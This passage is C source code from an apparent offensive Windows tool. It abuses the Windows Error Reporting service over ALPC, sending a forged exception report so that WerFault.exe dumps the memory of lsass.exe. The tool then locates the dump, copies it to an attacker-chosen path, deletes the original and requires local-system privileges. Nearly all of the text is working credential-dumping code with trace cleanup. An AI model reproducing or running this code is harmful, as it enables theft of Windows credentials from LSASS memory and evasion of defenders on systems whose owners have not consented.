        eStatus = RETSTATUS_FAILURE_MSG(L"MapViewOfFile() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Prepare the mapped view structure
    ptMappedView->Size = sizeof(*ptMappedView);
    ptMappedView->ExceptionPointers = &tExceptionPointers;
    ptMappedView->hCompletionEvent = hCompletionEvent;
    ptMappedView->hRecoveryEvent = hRecoveryEvent;
    ptMappedView->NtErrorCode = (DWORD)E_FAIL;
    ptMappedView->NtStatusErrorCode = (DWORD)STATUS_UNSUCCESSFUL;
    ptMappedView->TickCount = (DWORD)GetTickCount64();
    ptMappedView->TargetProcessPid = dwProcessPid;
    ptMappedView->hTargetProcess = hProcessHandle;
    ptMappedView->TargetThreadTid = dwFirstThreadId;
    ptMappedView->hTargetThread = hFirstThread;

    // Prepare the ALPC request
    tSendingMessage.PortMessage.u1.s1.TotalLength = sizeof(tSendingMessage);
    tSendingMessage.PortMessage.u1.s1.DataLength = sizeof(tSendingMessage) - sizeof(PORT_MESSAGE);
    tSendingMessage.MessageType = WER_SVC_MESSAGE_ID_REQUEST_REPORT_UNHANDLED_EXCEPTION;
    tSendingMessage.Flags = 0;
    tSendingMessage.hFileMapping = hFileMapping;
    tSendingMessage.hCompletionEvent = hCompletionEvent;
    tSendingMessage.hRecoveryEvent = hRecoveryEvent;
    tSendingMessage.hFileMapping2 = hFileMapping;
    tSendingMessage.hTargetProcess = hProcessHandle;
    tSendingMessage.hTargetThread = hFirstThread;
    tSendingMessage.TargetProcessId = dwProcessPid;

    // Prepare the ALPC response
    tReceivingMessage.PortMessage.u1.s1.TotalLength = sizeof(tReceivingMessage);
    tReceivingMessage.PortMessage.u1.s1.DataLength = sizeof(tReceivingMessage) - sizeof(PORT_MESSAGE);

    // Send the request and get the response from the ALPC server
    eStatus = dumpshtinkering_SendMessageToWerService(&tSendingMessage, &tReceivingMessage);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"dumpshtinkering_SendMessageToWerService failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Check if the message type indicates a failure
    if (WER_SVC_MESSAGE_ID_REPLY_REPORT_UNHANDLED_EXCEPTION_FAILURE != tReceivingMessage.MessageType)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"WER sent a message of type %lu", tReceivingMessage.MessageType);
        goto lblCleanup;
    }

    // The reply flags are actually a handle to WerFault.exe
    hWerProcess = (HANDLE)(ULONG_PTR)(tReceivingMessage.Flags);

    // Wait for WerFault.exe to exit
    for (;;)
    {
        eNtStatus = pfnNtWaitForSingleObject(hWerProcess, TRUE, NULL);
        if ((!NT_SUCCESS(eNtStatus)) || (STATUS_TIMEOUT == eNtStatus))
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"NtWaitForSingleObject() failed (eNtStatus=%lu)", eNtStatus);
            goto lblCleanup;
        }

        // We might have returned due to an APC or because the wait was aborted
        if ((STATUS_USER_APC != eNtStatus) && (STATUS_ALERTED != eNtStatus))
        {
            break;
        }
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_HANDLE(hWerProcess);
    UNMAP_VIEW_OF_FILE(ptMappedView);
    CLOSE_HANDLE(hFileMapping);
    CLOSE_HANDLE(hCompletionEvent);
    CLOSE_HANDLE(hRecoveryEvent);
    CLOSE_HANDLE(hFirstThread);
    
    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpshtinkering_FindAndCopyDumpFile                                                 *
*  Purpose:      Finds the relevant dump file in the given directory and copies it.                  *
*  Parameters:   - pwszDumpPath - the destination path.                                              *
*                  - dwLsassPid - the process ID of lsass.exe.                                         *
*  Returns:      TRUE on success, FALSE otherwise.                                                   *
*  Remarks:      - Attempts to delete the source dump file.                                          *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
static
RETSTATUS
dumpshtinkering_FindAndCopyDumpFile(
    __in __notnull PWSTR pwszDumpPath,
    __in DWORD dwLsassPid
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    WCHAR wszCrashDumpsDirectory[MAX_PATH] = {0};
    WCHAR wszSearchPattern[MAX_PATH] = { 0 };
    HRESULT hrStringResult = E_UNEXPECTED;
    WIN32_FIND_DATAW tFindData = {0};
    WCHAR wszSourceFile[MAX_PATH] = { 0 };
    BOOL bDeleteSourceFile = FALSE;

    // Validate parameters
    DEBUG_ASSERT(NULL != pwszDumpPath);

    // Build the dump directory
    if (0 == ExpandEnvironmentStringsW(CRASH_DUMPS_DIRECTORY, wszCrashDumpsDirectory, ARRAYSIZE(wszCrashDumpsDirectory)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Build the search pattern
    hrStringResult = StringCchPrintfW(wszSearchPattern, ARRAYSIZE(wszSearchPattern), L"%s\\lsass.exe*.%lu.dmp", wszCrashDumpsDirectory, dwLsassPid);
    if (FAILED(hrStringResult))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"StringCchPrintfW() failed (hrStringResult=%.8x)", hrStringResult);
        goto lblCleanup;
    }

    // Find the dump file
    hFind = FindFirstFileW(wszSearchPattern, &tFindData);
    if (INVALID_HANDLE_VALUE == hFind)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"FindFirstFileW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Get the source file full path
    hrStringResult = StringCchPrintfW(wszSourceFile, ARRAYSIZE(wszSourceFile), L"%s\\%s", wszCrashDumpsDirectory, tFindData.cFileName);
    if (FAILED(hrStringResult))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"StringCchPrintfW() failed (hrStringResult=%.8x)", hrStringResult);
        goto lblCleanup;
    }
    bDeleteSourceFile = TRUE;

    // Copy the destination file
    if (!CopyFileW(wszSourceFile, pwszDumpPath, FALSE))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CopyFileW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    if (bDeleteSourceFile)
    {
        (VOID)DeleteFileW(wszSourceFile);
    }
    CLOSE_FILE_FIND(hFind);

    // Return result
    return eStatus;
}

/****************************************************************************************************
*                                                                                                   *
* Function:     ShtinkeringDumpToDisk                                                               *
*                                                                                                   *
*****************************************************************************************************/
__success(return >= 0)
RETSTATUS
DUMPSHTINKERING_DumpToDisk(
    __in DWORD nArgs,
    __in_ecount(nArgs) __notnull PWSTR* ppwszArgs
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    DWORD dwLsassPid = 0;
    HANDLE hLsassProcess = NULL;
    BOOL bIsLocalSystem = FALSE;
    WCHAR wszDumpFullPath[MAX_PATH] = { 0 };

    // Validate arguments
    if (ARG_INDEX_LSASS_HANDLE_FETCH_TYPE >= nArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid number of arguments");
        goto lblCleanup;
    }
    if (NULL == ppwszArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (ppwszArgs=%p)", ppwszArgs);
        goto lblCleanup;
    }

    // Validate we are running as local system
    eStatus = COMMON_IsLocalSystem(&bIsLocalSystem);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_IsLocalSystem failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }
    if (!bIsLocalSystem)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Method must run as local system");
        goto lblCleanup;
    }

    // Expand environment variables to the dump path
    if (0 == ExpandEnvironmentStringsW(ppwszArgs[ARG_INDEX_DUMP_PATH], wszDumpFullPath, ARRAYSIZE(wszDumpFullPath)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Open lsass.exe
    eStatus = COMMON_FetchLsassHandleFromString(ppwszArgs[ARG_INDEX_LSASS_HANDLE_FETCH_TYPE], &hLsassProcess, &dwLsassPid, PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, TRUE);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FetchLsassHandleFromString failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Dump using WER
    eStatus = dumpshtinkering_ReportExceptionToWer(dwLsassPid, hLsassProcess);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"ReportExceptionToWer failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Find and copy the dump file
    eStatus = dumpshtinkering_FindAndCopyDumpFile(wszDumpFullPath, dwLsassPid);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"FindAndCopyDumpFile failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_HANDLE(hLsassProcess);

    // Return result
    return eStatus;
}